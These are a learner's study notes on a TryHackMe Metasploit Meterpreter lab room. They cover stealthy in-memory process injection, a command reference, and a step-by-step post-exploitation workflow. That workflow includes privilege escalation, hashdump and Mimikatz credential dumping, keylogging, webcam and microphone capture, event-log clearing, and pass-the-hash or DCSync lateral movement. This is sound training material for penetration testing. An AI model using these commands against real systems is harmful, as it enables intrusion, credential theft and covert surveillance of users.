# Metasploit: Meterpreter

> TryHackMe | Cyber Security 101  
> Room: [Metasploit: Meterpreter](https://tryhackme.com/room/meterpreter)

---

## 📌 Overview

This room focuses entirely on Meterpreter — what it is, how it works under the
hood, how to choose the right version, and how to use it effectively during
post-exploitation. Unlike a basic shell, Meterpreter is a full-featured agent
that gives you powerful tools without touching the disk on the target.

**Topics covered:**
- How Meterpreter works and why it is stealthy
- Meterpreter versions and how to choose the right one
- Complete command reference (core, filesystem, network, system, extras)
- Key post-exploitation commands in practice
- Loading extensions (Kiwi / Python)
- Post-exploitation goals and workflow

---

## 🧠 How Meterpreter Works

### Architecture

Meterpreter is a Metasploit payload that acts as an **agent within a
command-and-control (C2) architecture**. Once a target is exploited, Meterpreter
runs on the target and you interact with it from your attacking machine through
`msfconsole`.

### Why it is stealthy (and why it's not perfect)

| Technique | How it helps |
|-----------|-------------|
| **Runs entirely in memory (RAM)** | Never writes `meterpreter.exe` or any file to disk — avoids file-based AV scans |
| **Injects into an existing process** | Appears as a legitimate process (e.g. `spoolsv.exe`) in the process list |
| **No DLL footprint** | `tasklist /m` on the injected process shows only legitimate Windows DLLs |
| **Encrypted communication (TLS)** | Traffic to/from attacker machine is encrypted — evades network IDS/IPS that don't inspect encrypted traffic |

> ⚠️ Despite all of the above, **most modern antivirus software will detect
> Meterpreter**. Memory-resident doesn't mean invisible — behavioral analysis
> catches it. The stealth features buy time, not immunity.

### Process injection in practice

```
# After exploiting MS17-010, Meterpreter runs inside spoolsv.exe (PID 1304)

meterpreter > getpid
Current pid: 1304

meterpreter > ps
# PID 1304 shows as spoolsv.exe — not meterpreter.exe

# Even checking DLLs loaded by PID 1304 shows only legitimate Windows DLLs
C:\> tasklist /m /fi "pid eq 1304"
# Output: ntdll.dll, kernel32.dll, KERNELBASE.dll ... (no meterpreter.dll)
```

---

## 🔀 Choosing a Meterpreter Version

### Available platforms

```bash
# List all Meterpreter payloads
msfvenom --list payloads | grep meterpreter
```

Meterpreter is available for:

| Platform | Example payload |
|----------|----------------|
| Android | `android/meterpreter/reverse_tcp` |
| Apple iOS | `apple_ios/aarch64/meterpreter_reverse_tcp` |
| Java | `java/meterpreter/reverse_tcp` |
| Linux | `linux/x64/meterpreter/reverse_tcp` |
| macOS | `osx/x64/meterpreter/reverse_tcp` |
| PHP | `php/meterpreter/reverse_tcp` |
| Python | `python/meterpreter/reverse_tcp` |
| Windows | `windows/x64/meterpreter/reverse_tcp` |

### Decision factors

Choose based on three things:

1. **Target OS** — Windows, Linux, Android, iOS, macOS?
2. **What's installed on target** — Python available? PHP running? Java?
3. **Network constraints** — Is raw TCP blocked? Does only HTTPS work?
   Are IPv6 addresses less monitored than IPv4?

### Staged vs Inline (review)

```
windows/x64/meterpreter/reverse_tcp    ← staged (/ between meterpreter and reverse)
windows/x64/meterpreter_reverse_tcp   ← inline/stageless (_ between meterpreter and reverse)
```

> 💡 Some exploits have a **default Meterpreter payload** pre-configured.
> For example, `ms17_010_eternalblue` defaults to
> `windows/x64/meterpreter/reverse_tcp`. Always verify with `show payloads`
> if you want to use something different.

```bash
msf6 > use exploit/windows/smb/ms17_010_eternalblue
# [*] Using configured payload windows/x64/meterpreter/reverse_tcp

msf6 exploit(...) > show payloads   # see all compatible alternatives
msf6 exploit(...) > set payload 6   # switch to a different one
```

---

## ⌨️ Meterpreter Command Reference

> Run `help` inside any Meterpreter session to see all commands available
> for that specific version. Commands vary between platforms.

---

### 🔹 Core Commands

| Command | Description |
|---------|-------------|
| `help` or `?` | Display help menu with all available commands |
| `background` or `bg` | Background this session, return to msfconsole |
| `exit` | Terminate the Meterpreter session |
| `guid` | Get the session GUID (Globally Unique Identifier) |
| `sessions` | List or switch to another active session |
| `info` | Display info about a post module |
| `load <extension>` | Load a Meterpreter extension (e.g. kiwi, python) |
| `run <module>` | Execute a Meterpreter script or post module |
| `migrate <PID>` | Migrate Meterpreter into another running process |
| `irb` | Open an interactive Ruby shell on current session |
| `bgrun` | Execute a Meterpreter script as a background thread |
| `bglist` | List running background scripts |
| `bgkill` | Kill a background Meterpreter script |
| `channel` | Display info or control active channels |

---

### 🔹 File System Commands

| Command | Description |
|---------|-------------|
| `pwd` | Print current working directory |
| `cd <path>` | Change directory |
| `ls` or `dir` | List files in current directory |
| `cat <file>` | Display contents of a file |
| `edit <file>` | Edit a file |
| `rm <file>` | Delete a file |
| `search -f <filename>` | Search for files by name across the system |
| `upload <local> <remote>` | Upload a file or directory to target |
| `download <remote> <local>` | Download a file or directory from target |

**Search example:**
```bash
meterpreter > search -f flag2.txt
Found 1 result...
    c:\Windows\System32\config\flag2.txt (34 bytes)

meterpreter > search -f secrets.txt
Found 1 result...
    c:\Program Files (x86)\Windows Multimedia Platform\secrets.txt
```

---

### 🔹 Networking Commands

| Command | Description |
|---------|-------------|
| `ifconfig` | Display network interfaces on the target system |
| `arp` | Display the host ARP cache |
| `netstat` | Display active network connections |
| `portfwd` | Forward a local port to a remote service |
| `route` | View and modify the routing table |

---

### 🔹 System Commands

| Command | Description |
|---------|-------------|
| `sysinfo` | Get OS, hostname, architecture info |
| `getuid` | Show the user Meterpreter is running as |
| `getpid` | Show current process ID |
| `ps` | List all running processes (with PID, user, path) |
| `kill <PID>` | Terminate a process by PID |
| `pkill <name>` | Terminate processes by name |
| `execute <cmd>` | Execute a command on the target |
| `shell` | Drop into a native OS command shell (CTRL+Z to return) |
| `getsystem` | Attempt privilege escalation to SYSTEM/root |
| `hashdump` | Dump the SAM database (Windows NTLM password hashes) |
| `clearev` | Clear Windows event logs |
| `reboot` | Reboot the remote computer |
| `shutdown` | Shut down the remote computer |

---

### 🔹 User Interface & Surveillance Commands

| Command | Description |
|---------|-------------|
| `screenshot` | Grab a screenshot of the target desktop |
| `screenshare` | Watch the target desktop in real time |
| `keyscan_start` | Start capturing keystrokes |
| `keyscan_stop` | Stop capturing keystrokes |
| `keyscan_dump` | Dump the captured keystroke buffer |
| `record_mic` | Record audio from the default microphone |
| `webcam_list` | List available webcams |
| `webcam_snap` | Take a snapshot from a webcam |
| `webcam_stream` | Stream live video from a webcam |
| `webcam_chat` | Start a video chat |
| `idletime` | Return seconds since the remote user last had input |

---

### 🔹 Password & Privilege Commands

| Command | Description |
|---------|-------------|
| `getsystem` | Try all privilege escalation techniques to reach SYSTEM |
| `hashdump` | Dump SAM database — returns NTLM hashes for all local users |

---

## 🔍 Key Commands In Practice

### Check who you are and where you are

```bash
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

meterpreter > sysinfo
Computer        : ACME-TEST
OS              : Windows 7 (6.1 Build 7601, Service Pack 1)
Architecture    : x64
System Language : en_US
Domain          : FLASH
Logged On Users : 1
Meterpreter     : x64/windows

meterpreter > getpid
Current pid: 1304
```

> 💡 `getuid` is always your first command after getting a session. Knowing
> whether you're SYSTEM, Administrator, or a low-privileged user determines
> what you can do next without triggering errors.

---

### List and migrate processes

```bash
meterpreter > ps
# Shows PID, PPID, Name, Arch, Session, User, Path for every process

meterpreter > migrate 716
[*] Migrating from 1304 to 716...
[*] Migration completed successfully.
```

**Why migrate?**
- Attach to a word processor → enable keylogging on that process
- Move to a more stable long-running process → avoid losing session
- Move to a SYSTEM process → potentially gain higher privileges

> ⚠️ Migrating from a high-privilege process (SYSTEM) to a low-privilege one
> (e.g. a user's browser) will **drop your privileges**. You likely cannot get
> them back without re-exploiting. Always check `getuid` before and after
> migrating.

---

### Dump password hashes

```bash
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
```

**Reading NTLM hash output:**
```
username : RID : LM_hash : NTLM_hash :::
Jon      : 1000 : aad3b435... : ffb43f0de35be4d9917ac0cc8ad57f8d
                                ↑ this is the crackable NTLM hash
```

**What you can do with NTLM hashes:**
- Look up in online databases (crackstation.net, etc.)
- Rainbow table attacks
- **Pass-the-Hash** — authenticate to other systems on the network using
  the hash directly, without cracking it

> 💡 `aad3b435b51404eeaad3b435b51404ee` in the LM field means the LM hash is
> empty (disabled) — this is normal on modern Windows. The NTLM hash is what
> matters.

---

### Drop into a system shell

```bash
meterpreter > shell
Process 2124 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
C:\Windows\system32>

# To return to Meterpreter:
CTRL+Z
```

---

### Search for files

```bash
# Find by filename
meterpreter > search -f flag.txt
meterpreter > search -f *.txt
meterpreter > search -f secrets.txt

# Read the file once found
meterpreter > cat "c:\Program Files (x86)\Windows Multimedia Platform\secrets.txt"
```

---

## 🔌 Loading Extensions

Meterpreter can be extended with additional modules using the `load` command.
After loading, run `help` to see new commands added to the menu.

### Kiwi (Mimikatz)

Kiwi is a port of Mimikatz — the most powerful Windows credential dumping tool.

```bash
meterpreter > load kiwi
# Loads mimikatz 2.2.0 into the session

meterpreter > help
# New section: Kiwi Commands
```

**Kiwi commands:**

| Command | Description |
|---------|-------------|
| `creds_all` | Retrieve ALL credentials (parsed output) |
| `creds_kerberos` | Retrieve Kerberos credentials |
| `creds_msv` | Retrieve LM/NTLM credentials |
| `creds_wdigest` | Retrieve WDigest credentials (cleartext on older Windows) |
| `creds_ssp` | Retrieve SSP credentials |
| `creds_tspkg` | Retrieve TsPkg credentials |
| `lsa_dump_sam` | Dump LSA SAM (raw) |
| `lsa_dump_secrets` | Dump LSA secrets (raw) |
| `dcsync` | Retrieve user account info via DCSync (domain controller attack) |
| `dcsync_ntlm` | Retrieve NTLM hash via DCSync |
| `golden_ticket_create` | Create a Kerberos golden ticket |
| `kerberos_ticket_list` | List all Kerberos tickets |
| `kerberos_ticket_purge` | Remove in-use Kerberos tickets |
| `kerberos_ticket_use` | Use a specific Kerberos ticket |
| `password_change` | Change a user's password or hash |
| `wifi_list` | List Wi-Fi credentials for current user |
| `wifi_list_shared` | List shared Wi-Fi credentials (requires SYSTEM) |
| `kiwi_cmd <cmd>` | Execute any arbitrary Mimikatz command directly |

> 💡 `creds_all` is your fastest path to everything — it runs all credential
> retrieval methods in one shot. Start there, then dig deeper with specific
> commands if needed.

---

### Python

```bash
meterpreter > load python

meterpreter > python_execute "print('TryHackMe Rocks!')"
[+] Content written to stdout:
TryHackMe Rocks!
```

Loading Python gives you a full scripting environment on the target — useful
for custom post-exploitation tasks without uploading additional files.

---

## 🎯 Post-Exploitation Goals & Workflow

Once you have a Meterpreter session, the post-exploitation phase has four goals:

```
1. GATHER INFORMATION   → sysinfo, getuid, ps, ifconfig, netstat
2. FIND VALUABLE DATA   → search, cat, download, hashdump, creds_all
3. PRIVILEGE ESCALATION → getsystem, migrate to SYSTEM process
4. LATERAL MOVEMENT     → hashdump → pass-the-hash, dcsync → other systems
```

### Typical post-exploitation flow

```bash
# Step 1 — Orient yourself
meterpreter > sysinfo         # OS, hostname, domain, arch
meterpreter > getuid          # who am I?
meterpreter > getpid          # what process am I in?

# Step 2 — Escalate if needed
meterpreter > getsystem       # attempt SYSTEM escalation
meterpreter > getuid          # confirm: NT AUTHORITY\SYSTEM

# Step 3 — Gather credentials
meterpreter > hashdump        # NTLM hashes from SAM
meterpreter > load kiwi
meterpreter > creds_all       # all credentials in one shot

# Step 4 — Find sensitive files
meterpreter > search -f *.txt
meterpreter > search -f flag*.txt
meterpreter > cat "c:\path\to\file.txt"
meterpreter > download "c:\path\to\file.txt" /local/path/

# Step 5 — Keylog if a user is active
meterpreter > ps              # find user's active process (e.g. notepad.exe)
meterpreter > migrate <PID>   # migrate to that process
meterpreter > keyscan_start
# ... wait ...
meterpreter > keyscan_dump
meterpreter > keyscan_stop

# Step 6 — Use post modules
meterpreter > background
msf6 > use post/windows/gather/enum_shares   # example post module
msf6 > set SESSION 1
msf6 > run
```

---

## 💡 Insights & Things to Remember

**Always run `help` first in a new Meterpreter session:**  
Commands differ between versions (Windows vs Linux vs Android). What works on
one may not exist on another. `help` shows you exactly what's available.

**`getsystem` before `hashdump`:**  
`hashdump` reads the SAM database which requires SYSTEM privileges. If you're
running as a regular user or even Administrator, `hashdump` will fail.
Run `getsystem` first, verify with `getuid`, then `hashdump`.

**Migrate carefully:**  
Migrating from SYSTEM to a lower-privileged process permanently drops your
privileges in that session. Check `getuid` before migrating and think about
whether the new process is worth the privilege loss.

**Kiwi > hashdump for modern Windows:**  
On Windows 8.1+ and Server 2012+, `hashdump` may fail even with SYSTEM due to
protected processes. Kiwi's `lsa_dump_sam` or `creds_all` are more reliable
in those environments.

**`search` is underused in CTFs:**  
Instead of guessing file locations, `search -f flag*.txt` will find it anywhere
on the filesystem. In real engagements, `search -f *.kdbx` (KeePass databases),
`search -f *.config`, or `search -f id_rsa` are high-value targets.

**Shell vs Meterpreter:**  
The `shell` command drops you into a basic OS shell — faster for simple commands,
but no Meterpreter features. Use `CTRL+Z` to background the shell channel and
return to Meterpreter. Use `CTRL+C` to kill it entirely.

---

## ⚖️ Reflection

**What clicked:**
- The process injection model (running inside `spoolsv.exe`) makes clear why
  Meterpreter is harder to detect than a simple reverse shell — a process
  analyst would need to inspect memory, not just the process list
- Kiwi/Mimikatz being loadable as a Meterpreter extension without uploading
  any file to disk is elegant — it extends the same in-memory stealth principle
- The post-exploitation goal framework (gather → find → escalate → move
  laterally) gives structure to what could otherwise feel like random commands

**Still unclear:**
- What specific privilege escalation techniques does `getsystem` try?
  (Token impersonation? Named pipe exploitation? Service abuse?)
- When would you use `dcsync` vs `hashdump`? (`dcsync` targets domain
  controllers — this suggests `dcsync` is for Active Directory environments
  while `hashdump` is for local credentials)
- How does `portfwd` work and when would you use it in lateral movement?

**Next:**
- Active Directory attacks — where Kiwi's DCSync and golden ticket features
  become central
- Network pivoting — using `route` and `portfwd` to reach internal network
  segments through a compromised host

---

## 📚 References

- [TryHackMe - Metasploit: Meterpreter](https://tryhackme.com/room/meterpreter)
- [Metasploit Unleashed - Meterpreter](https://www.offsec.com/metasploit-unleashed/about-meterpreter/)
- [Mimikatz / Kiwi reference](https://github.com/gentilkiwi/mimikatz)
- [CrackStation — NTLM hash lookup](https://crackstation.net/)
